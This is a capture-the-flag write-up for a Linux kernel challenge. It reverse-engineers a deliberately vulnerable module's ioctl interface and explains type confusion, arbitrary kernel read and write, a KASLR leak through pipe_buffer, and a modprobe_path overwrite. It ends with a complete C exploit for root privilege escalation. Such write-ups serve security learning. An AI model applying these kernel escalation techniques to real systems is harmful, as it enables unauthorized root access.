# Introduction

In this challenge we are given a [zip file](assets/heavy_crown.zip) containing a vmlinuz file
(linux kernel image) ,an initramfs and a `run.sh` script

## Exploration

Once decompressed, looking at the `/init` file in the initramfs, we see the following line:
```bash
insmod /lib/modules/krown.ko
```
`init` inserts a kernel module located at `/lib/modules/krown.ko`, likely the one we have to exploit.

## Krown.ko Reverse Engineering
This alone could be a challenge writeup. but to keep it simple, we have an `init_module` that registers
a `/dev/krown` special file, and defines an `ioctl` for it:
```c

/* WARNING: Function: __x86_return_thunk replaced with injection: x86_return_thunk */
/* WARNING: Removing unreachable block (ram,0x00100098) */

long krown_ioctl(void *fp,uint code,void *userf_buf)

{
  long result;
  long err;
  astruct *allocated_crown;
  astruct *crown;
  long in_GS_OFFSET;
  astruct_1 user_data;
  long local_20;
  
  local_20 = *(long *)(in_GS_OFFSET + 0x28);
  memset(&user_data,0,0x120);
  result = -0x19;
  if ((code & 0xff00) != 0x4b00) goto err;
  err = _copy_from_user(&user_data,userf_buf,0x120);
  result = -0xe;
  if (err != 0) goto err;
  if (0x41204b01 < (int)code) {
    if ((int)code < 0x41204b04) {
      if (code == 0x41204b02) {
        result = krown_break(&user_data);
      }
      else {
        result = -0x19;
        if (code == 0x41204b03) {
          result = krown_bind(&user_data);
        }
      }
    }
    else if (code == 0x41204b04) {
      result = krown_unbind(&user_data);
    }
    else if (code == 0x41204b06) {
      result = krown_impress(&user_data);
    }
    else {
      result = -0x19;
      if (code == 0x41204b08) {
        result = krown_inscribe(&user_data);
      }
    }
    goto err;
  }
  if ((int)code < -0x3edfb4fb) {
    if (code == 0xc1204b00) {
      crown = krown_alloc(1);
      if (crown == (astruct *)0x0) {
crown_alloc_err:
        result = -0xc;
        goto err;
      }
      crown->structures[0xf] = (astruct *)0x0;
      crown->structures[0xe] = (astruct *)0x0;
      crown->structures[0xd] = (astruct *)0x0;
      crown->structures[0xc] = (astruct *)0x0;
      crown->structures[0xb] = (astruct *)0x0;
      crown->structures[10] = (astruct *)0x0;
      crown->structures[9] = (astruct *)0x0;
      crown->structures[8] = (astruct *)0x0;
      crown->structures[7] = (astruct *)0x0;
      crown->structures[6] = (astruct *)0x0;
      crown->structures[5] = (astruct *)0x0;
      crown->structures[4] = (astruct *)0x0;
      crown->structures[3] = (astruct *)0x0;
      crown->structures[2] = (astruct *)0x0;
      crown->structures[1] = (astruct *)0x0;
      crown->structures[0] = (astruct *)0x0;
      crown->data_unknown[0] = '\0';
      crown->data_unknown[1] = '\0';
      crown->data_unknown[2] = '\0';
      crown->data_unknown[3] = '\0';
      crown->data_unknown[4] = '\0';
      crown->data_unknown[5] = '\0';
      crown->data_unknown[6] = '\0';
      crown->data_unknown[7] = '\0';
      crown->data_unknown[8] = '\0';
      crown->data_unknown[9] = '\0';
      crown->data_unknown[10] = '\0';
      crown->data_unknown[0xb] = '\0';
      crown->data_unknown[0xc] = '\0';
      crown->data_unknown[0xd] = '\0';
      crown->data_unknown[0xe] = '\0';
      crown->data_unknown[0xf] = '\0';
      crown->data_unknown[0x10] = '\0';
      crown->data_unknown[0x11] = '\0';
      crown->data_unknown[0x12] = '\0';
      crown->data_unknown[0x13] = '\0';
      crown->data_unknown[0x14] = '\0';
      crown->data_unknown[0x15] = '\0';
      crown->data_unknown[0x16] = '\0';
      crown->data_unknown[0x17] = '\0';
      crown->data_unknown[0x18] = '\0';
      crown->data_unknown[0x19] = '\0';
      crown->data_unknown[0x1a] = '\0';
      crown->data_unknown[0x1b] = '\0';
      crown->data_unknown[0x1c] = '\0';
      crown->data_unknown[0x1d] = '\0';
      crown->data_unknown[0x1e] = '\0';
      crown->data_unknown[0x1f] = '\0';
      crown->data_unknown[0x20] = '\0';
      crown->data_unknown[0x21] = '\0';
      crown->data_unknown[0x22] = '\0';
      crown->data_unknown[0x23] = '\0';
      crown->data_unknown[0x24] = '\0';
      crown->data_unknown[0x25] = '\0';
      crown->data_unknown[0x26] = '\0';
      crown->data_unknown[0x27] = '\0';
      crown->data_unknown[0x28] = '\0';
      crown->data_unknown[0x29] = '\0';
      crown->data_unknown[0x2a] = '\0';
      crown->data_unknown[0x2b] = '\0';
      crown->data_unknown[0x2c] = '\0';
      crown->data_unknown[0x2d] = '\0';
      crown->data_unknown[0x2e] = '\0';
      crown->data_unknown[0x2f] = '\0';
      crown->data_unknown[0x30] = '\0';
      crown->data_unknown[0x31] = '\0';
      crown->data_unknown[0x32] = '\0';
      crown->data_unknown[0x33] = '\0';
      crown->data_unknown[0x34] = '\0';
      crown->data_unknown[0x35] = '\0';
      crown->data_unknown[0x36] = '\0';
      crown->data_unknown[0x37] = '\0';
      crown->num_binds = 0;
      user_data.idx = crown->idx;
    }
    else {
      result = -0x19;
      if (code != 0xc1204b01) goto err;
      allocated_crown = krown_alloc(2);
      if (allocated_crown == (astruct *)0x0) goto crown_alloc_err;
      memset(allocated_crown->data_unknown + 0x18,0,0x1c8);
      allocated_crown->data_unknown[0] = '\0';
      allocated_crown->data_unknown[1] = '\0';
      allocated_crown->data_unknown[2] = '\0';
      allocated_crown->data_unknown[3] = '\0';
      allocated_crown->data_unknown[4] = '\0';
      allocated_crown->data_unknown[5] = '\0';
      allocated_crown->data_unknown[6] = '\0';
      allocated_crown->data_unknown[7] = '\0';
      user_data.idx = allocated_crown->idx;
    }
  }
  else {
    if (code == 0xc1204b05) {
      result = krown_examine(&user_data);
    }
    else {
      result = -0x19;
      if (code != 0xc1204b07) goto err;
      result = krown_witness(&user_data);
    }
    if (result != 0) goto err;
  }
  err = _copy_to_user(userf_buf,&user_data,0x120);
  result = -0xe;
  if (err == 0) {
    result = 0;
  }
err:
  if (*(long *)(in_GS_OFFSET + 0x28) != local_20) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return result;
}
```
This code has received significant clean up, and I will not delve into the details of `struct` reconstitution,
but this is the target.
The `ioctl` api offers several functions:
`krown_alloc(int type)` allocates a crown object of the given type, 1 or 2, and places it in a free entry
within the registry.
`krown_bind()` allows assigning a crown of type 2 to a crown of type 1, as shown:
```c
/* WARNING: Function: __x86_return_thunk replaced with injection: x86_return_thunk */
/* WARNING: Removing unreachable block (ram,0x001004bc) */

undefined8 krown_bind(astruct_1 *param_1)

{
  astruct *entry;
  uint idx;
  astruct *obj;
  
  idx = param_1->idx;
  if (0x3f < (ulong)idx) {
    return 0xffffffffffffffea;
  }
  mutex_lock(registry_lock);
  entry = registry[idx];
  if (((entry != (astruct *)0x0) && (entry->idx == idx)) && (entry->canary == global_cookie)) {
    mutex_unlock(registry_lock);
    if (entry->type != 1) {
      return 0xffffffffffffffea;
    }
    idx = param_1->type_2;
    if (0x3f < (ulong)idx) {
      return 0xffffffffffffffea;
    }
    mutex_lock(registry_lock);
    obj = registry[idx];
    if (((obj != (astruct *)0x0) && (obj->idx == idx)) && (obj->canary == global_cookie)) {
      mutex_unlock(registry_lock);
      if (obj->type != 2) {
        return 0xffffffffffffffea;
      }
      idx = entry->num_binds;
      if (0x10 < (ulong)idx) {
        return 0xffffffffffffffea;
      }
      if (idx == 0x10) {
        return 0xffffffffffffffe4;
      }
      entry->num_binds = idx + 1;
      entry->structures[idx] = obj;
      return 0;
    }
  }
  mutex_unlock(registry_lock);
  return 0xffffffffffffffea;
}
```
now is the interesting part:
```c
undefined8 krown_impress(astruct_1 *param_1)

{
  ulong __n;
  undefined8 retval;
  astruct *crown;
  uint idx;
  ulong offset;
  
  idx = param_1->idx;
  retval = 0xffffffffffffffea;
  if ((ulong)idx < 0x40) {
    mutex_lock(registry_lock);
    crown = registry[idx];
    if (((crown == (astruct *)0x0) || (crown->idx != idx)) || (crown->canary != global_cookie)) {
      mutex_unlock(registry_lock);
    }
    else {
      mutex_unlock(registry_lock);
      if ((crown->type == 1) && ((uint)crown->num_binds < 0x11)) {
        idx = param_1->type_2;
        if ((((-1 < (int)idx) &&
             (((int)idx < crown->num_binds && (crown->structures[idx] != (astruct *)0x0)))) &&
            (offset = param_1->offset, offset < 0x1f0)) &&
           ((__n = param_1->size, __n < 0x101 && (__n + offset < 0x1f1)))) {
          memcpy(crown->structures[idx]->data_unknown + (offset - 0x10),param_1->buffer,__n);
          retval = 0;
        }
      }
    }
  }
  return retval;
}
```
`krown_impress()` allows the user to select a crown whose `crown->type` field is 1, and an index
in its array of crown pointers, which it will interpret as a crown and write to it. furthermore,
looking at the definition for `astruct` (which I had to reconstruct), we see this:
```c
struct astruct {
    uint idx;
    uint type; /* Created by Rename Structure Field action */
    long canary;
    char data_unknown[56];
    int num_binds;
    int padding;
    struct astruct *structures[52];
};
```
The structures's data starts at `0x10`, and we are given an `-0x10` offset into it, meaning we can
overwrite the `type` field.Even better, we have the following functions available to us:
```c
undefined8 krown_inscribe(astruct_1 *param_1)

{
  size_t __n;
  undefined8 retval;
  astruct *crown;
  uint idx;
  
  idx = param_1->idx;
  retval = 0xffffffffffffffea;
  if ((ulong)idx < 0x40) {
    mutex_lock(registry_lock);
    crown = registry[idx];
    if (((crown == (astruct *)0x0) || (crown->idx != idx)) || (crown->canary != global_cookie)) {
      mutex_unlock(registry_lock);
    }
    else {
      mutex_unlock(registry_lock);
      if ((crown->type == 1) && (*(long *)crown->data_unknown != 0)) {
        __n = 0x100;
        if (param_1->size < 0x100) {
          __n = param_1->size;
        }
        memcpy((void *)(*(long *)crown->data_unknown + param_1->offset),param_1->buffer,__n);
        retval = 0;
      }
    }
  }
  return retval;
}

undefined8 krown_witness(astruct_1 *param_1)

{
  size_t __n;
  undefined8 retval;
  astruct *crown;
  uint idx;
  
  idx = param_1->idx;
  retval = 0xffffffffffffffea;
  if ((ulong)idx < 0x40) {
    mutex_lock(registry_lock);
    crown = registry[idx];
    if (((crown == (astruct *)0x0) || (crown->idx != idx)) || (crown->canary != global_cookie)) {
      mutex_unlock(registry_lock);
    }
    else {
      mutex_unlock(registry_lock);
      if ((crown->type == 1) && (*(long *)crown->data_unknown != 0)) {
        __n = 0x100;
        if (param_1->size < 0x100) {
          __n = param_1->size;
        }
        memcpy(param_1->buffer,(void *)(*(long *)crown->data_unknown + param_1->offset),__n);
        retval = 0;
      }
    }
  }
  return retval;
}
```
These two function allow us to repectively read or write to arbitrary memory, provided we can write to 
the first `qword` of `data_unknown` (remember that the `astruct_1` sent to these functions is attacker-controlled).

## Exploitation

We dispose of the following primitives:
1. We can retype crowns with `krown_impress`
2. We have arbitrary read using `krown_witness`
3. We have arbitrary write using `krown_inscribe`

## Gaining arbitrary read/write

In order to gain arbitrary write, we can do the following:

1. allocate a type-1 crown (`krown-0`).
2. allocate a type-2 crown (`krown-1`).
3. bind `krown-1` to `krown-0`.
4. retype `krown-1` so its type is 1.
5. We now have arbitrary read/write


## Linux kernel Heap basics

The linux kernel heap, unlike the glibc heap, operates by assigning slabs to each object size.
A call to `kmalloc` first choses the appropriate slab cache from which it should allocate, and then
searches for a free slot in the said cache. There are caches for different object sizes, such as
`kmalloc-512`, `kmalloc-256`, `kmalloc-128` and so on. A slab is a set of objects of this fixed size which
are contiguous in memory. This is however not a detailed explanation, and you should probably read  this [blog post](https://sam4k.com/linternals-memory-allocators-0x02/) if you are not confortable with linux kernel heap basics.

## Kernel Heap Leak
The heap leak is simple: we allocate another crown, and bind it to `krown-1`, then read its data by using `krown_examine` on `krown-0`.
From this leak, a simple `leak & 0x1fff` will give us the slab's start.

## KASLR Leak

KASLR is a mechanism that randomizes the kernel base on boot, similar to PIE or ASLR in userland,
but for the kernel.
In order to leak KALSR, we rely on the `pipe_buffer` structure:
```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```
This structure is allocated when using pipes, and can be moved to any general cache.You should read this [blog post](https://www.interruptlabs.co.uk/articles/pipe-buffer) for more details. We therefore fill the slab with `pipe_buffer` objects, and since the allocations are 512-bytes aligned, we can scan trough 512-byte aligned addresses within the slab
and read the `ops` field. since all of our pipes will have the same `buffer->ops` value, The most common value at this offset should give us a reliable KASLR leak.


## modprobe_path

Whenever the linux kernel is asked (via `execve()`, for instance) to execute a binary, it will try a series of options, one of the last ones being to call whichever
userland binary is located at `modprobe_path`. overwriting this therefore gives us a complete privilege escalation, as we can execute a binary whose contents are `\xff\xff`
to trigger this behavior. I encourage you to read [this blog](https://sam4k.com/like-techniques-modprobe_path/) for more details. Short story, we can write to it to obtain
our LPE.

## Final exploit
Putting all of this together, after long hours of debugging, leads to this:

```c
#define _GNU_SOURCE
#include <string.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#define PAGE_SIZE 4096
#define KROWN_BREAK 0x41204b02
#define KROWN_BIND 0x41204b03
#define KROWN_UNBIND 0x41204b04
#define KROWN_IMPRESS 0x41204b06
#define KROWN_INSCRIBE 0x41204b08
#define KROWN_ALLOC_TYPE_1 0xc1204b00
#define KROWN_ALLOC_TYPE_2 0xc1204b01
#define KROWN_EXAMINE 0xc1204b05
#define KROWN_WITNESS 0xc1204b07
#define OBJS_PER_SLAB 16
#define SLAB_CPU_PARTIAL 52
#define NUM_SPRAY 20
#define OPS_OFFSET 0x1221fd8
#define MODPROBE_PATH_OFFSET 0x184b380
struct __attribute__((packed)) krown_req {
  uint32_t idx;
  uint32_t type_2;
  uint64_t offset;
  uint64_t size;
  uint64_t unknown;
  char buffer[256];
};

char buf[PAGE_SIZE*200];
int main() {
  setbuf(stdout,NULL);
  int fd = open("/dev/krown",O_RDONLY);
  struct krown_req request;
  int pipefd[2];
  int i = 0x61626364;
  for (int i=0;i < 10;i++) {
    pipe(pipefd);
    fcntl(pipefd[0],F_SETPIPE_SZ,PAGE_SIZE * 8);
    fcntl(pipefd[1],F_SETPIPE_SZ,PAGE_SIZE * 8);
    write(pipefd[1],&i,4);
  }
  ioctl(fd,KROWN_ALLOC_TYPE_1,&request);
  ioctl(fd,KROWN_ALLOC_TYPE_2,&request);
  request.idx = 0;
  request.type_2 = 1;
  ioctl(fd,KROWN_BIND,&request);
  request.idx = 0;
  request.type_2 = 0;
  request.offset = 16;
  request.size = 8;
  uint32_t *start = (void*)request.buffer;
  uint64_t *start64 = (void*)request.buffer;
  *start64 = (uint64_t)&fd;
  printf("0x%lx\n",*start64);
  ioctl(fd,KROWN_IMPRESS,&request);
  request.offset = 4;
  request.size = 4;
  *start = 1;
  ioctl(fd,KROWN_IMPRESS,&request);

  ioctl(fd,KROWN_ALLOC_TYPE_2,&request);
  request.idx = 1;
  request.type_2 = 2;

  ioctl(fd,KROWN_BIND,&request);

  request.offset = 0x50;
  request.size = 8;
  request.idx = 0;
  request.type_2 = 0;
  ioctl(fd,KROWN_EXAMINE,&request);
  perror("ioctl");
  printf("0x%lx\n",*start64);
  uint64_t heap_leak = *start64;
  uint64_t slab_base = heap_leak & ~0x1fff;
  printf("slab starts at 0x%lx\n",slab_base);
  /* exploit phase 2
   * registry : [ <type_1>, <type_1>, <type_2> ]
   * registry[0]->structures[0] is a type 1 crown, located at index 1
   * registry[1]->structures[0] is a normal type 2 crown.
   * */
  request.size = 8;
  *start64 = slab_base;
  request.idx = 0;
  request.type_2 = 0;
  request.offset = 0x10;
  // we write the slab base to the krown, in preparation for arbitrary read
  ioctl(fd,KROWN_IMPRESS,&request);
  request.idx = 1;
  uint64_t offsets[16];
  for (int i=0;i < 16;i++) {
    request.offset = 512*i + 0x10; // we read the start of each of the slab's objects
    ioctl(fd,KROWN_WITNESS,&request);
    offsets[i] = *start64;
  }
  int num = 0;
  int idx = -1;
  for (int i=0; i < 16;i++) {
    if (offsets[i] == 0) continue;
    int tmp = 0;
    for (int j=0;j < 16;j++) {
      if (offsets[j] == offsets[i]) tmp++; 
    }
    if (tmp > num)  {
      num = tmp;
      idx = i;
    }
  }
  printf("kernel base: 0x%lx\n",offsets[idx] - OPS_OFFSET);
  request.size = 8;
  *start64 = offsets[idx] - OPS_OFFSET + MODPROBE_PATH_OFFSET;
  request.idx = 0;
  request.type_2 = 0;
  request.offset = 0x10;
  // we now write the address of MODPROBE_PATH to our double-typed crown.
  ioctl(fd,KROWN_IMPRESS,&request);
  request.size = 8;
  memcpy(request.buffer,"/final\x00\x00",8); // replace this with the path of the binary you wish to execute as root
  request.offset = 0;
  request.idx = 1;
  // final exploit: we overwrite modprobe_path
  ioctl(fd,KROWN_INSCRIBE,&request);
}
```





